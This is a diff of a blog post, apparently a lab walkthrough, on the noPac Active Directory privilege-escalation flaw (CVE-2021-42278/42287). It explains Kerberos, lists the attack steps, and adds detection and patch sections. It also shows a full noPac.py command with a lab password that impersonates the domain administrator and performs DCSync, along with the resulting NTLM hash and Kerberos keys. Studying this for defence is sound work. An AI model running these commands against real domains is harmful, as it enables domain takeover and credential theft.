@@ -106,6 +106,12 @@
 			</a>
 		  </li>
 		  
+		  <li>
+			<a href="/about/resume.pdf" title="About me.">
+			  <i class="fa fa-file"></i>Resume
+			</a>
+		  </li>
+		  
 		</ul>
       </div>
     </div> <!-- container -->
@@ -142,7 +148,6 @@
 
 	  <p><img src="/images/NOPACK.png" alt="alt text"></p>
 <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>NoPAC is a privilege escalation vulnerability in Active Directory environments that allows an authenticated low-privileged user to impersonate any user, including Domain Admins</p>
-<h2 id="The-Inside-Out"><a href="#The-Inside-Out" class="headerlink" title="The Inside Out"></a>The Inside Out</h2><p>This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.</p>
 <table>
 <thead>
 <tr>
@@ -159,12 +164,38 @@
 <td>42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.</td>
 </tr>
 </tbody></table>
+<span id="more"></span>
+
+<h3 id="AD-Kerberos-Authentication"><a href="#AD-Kerberos-Authentication" class="headerlink" title="AD Kerberos Authentication"></a>AD Kerberos Authentication</h3><p>A ticket-granting-ticket (TGT) is a ticket assigned to a user that is used to authenticate to the KDC and request a service ticket from the ticket-granting-service (TGS). Service tickets are granted for authentication against services.<br><img src="/../images/npac.png" alt="KDC"> Figure. Kerberos authentication process</p>
+<hr>
+<h2 id="CVEs-2021-42278-and-2021-42287"><a href="#CVEs-2021-42278-and-2021-42287" class="headerlink" title="CVEs 2021-42278 and 2021-42287"></a>CVEs 2021-42278 and 2021-42287</h2><p>This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>42278</td>
+<td>42278 is a bypass vulnerability with the Security Account Manager (SAM).</td>
+</tr>
+<tr>
+<td>42287</td>
+<td>42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.</td>
+</tr>
+</tbody></table>
+<br>
+
 <p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain.</p>
 <p>When doing so, we change the name of the new host to match a Domain Controller’s SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC’s name instead of the new name. </p>
 <p>When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post.</p>
+<p>The tickets are distributed by the Key Distribution Center (KDC). In AD environments, the KDC is installed on the Domain Controller (DC).</p>
+<p>with the attack:<br>Adversaries can leverage these two vulnerabilities together to escalate to domain admin privileges from a standard domain user.</p>
+<p>How It Works</p>
+<p>Machine account creation<br>Service Principal Names (SPNs) are cleared<br>sAMAccountName is renamed to the DC name without a $<br>Ticket-granting-ticket (TGT) is requested<br>sAMAccountName is renamed with a different name<br>Service ticket requested with S4U2self extension</p>
 <p>In November 9, 2021: Microsoft released initial security updates that addressed both CVE‑2021‑42278 (SAM spoofing) and CVE‑2021‑42287 (Kerberos PAC bypass)<br><a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/kb5011266">support.microsoft.com+15</a></p>
-<h3 id="Potential-precursor-to-ransomware-infections"><a href="#Potential-precursor-to-ransomware-infections" class="headerlink" title="Potential precursor to ransomware infections"></a>Potential precursor to ransomware infections</h3><p>After gaining domain access, a threat actor’s ability to deploy additional malware, including ransomware, is virtually unlimited. AD abuse is involved in most ransomware incidents Secureworks researchers investigate. Threat actors typically leverage misconfigurations to escalate privileges within AD. In this case, AD design flaws create the escalation path.</p>
-<h1 id="Setup"><a href="#Setup" class="headerlink" title="Setup:"></a>Setup:</h1><h4 id="Ensuring-Impacket-is-Installed"><a href="#Ensuring-Impacket-is-Installed" class="headerlink" title="Ensuring Impacket is Installed"></a>Ensuring Impacket is Installed</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git</span><br></pre></td></tr></table></figure>
+<h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup:"></a>Setup:</h2><h4 id="Ensuring-Impacket-is-Installed"><a href="#Ensuring-Impacket-is-Installed" class="headerlink" title="Ensuring Impacket is Installed"></a>Ensuring Impacket is Installed</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git</span><br></pre></td></tr></table></figure>
 
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ python setup.py install </span><br></pre></td></tr></table></figure>
@@ -182,6 +213,10 @@
 <p>We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the <code>-dump</code> flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.</p>
 <p> <code>Using noPac to DCSync the Built-in Administrator Account</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</span><br><span class="line"></span><br><span class="line">                                                                    </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] will try to impersonat administrator</span><br><span class="line">[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Pls make sure your choice hostname and the -dc-ip are same machine !!</span><br><span class="line">[*] Exploiting..</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
+
+<h2 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h2><p>Exploiting the noPac vulnerability generates the following Security Auditing Windows event logs.<br><img src="/../images/kb.png" alt="alt text"></p>
+<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>Microsoft’s patch adds Security Accounts Manager Hardening changes along with Key Distribution Center (KDC) authentication updates.</p>
+<p>These changes prevent sAMAccountName spoofing by adding validation for a computer account’s sAMAccountName ending in a single dollar sign. The original requester will also be added to the PAC of the TGT, helping prevent domain controller impersonation.</p>
 
 	  <div class="article-footer-copyright">
 
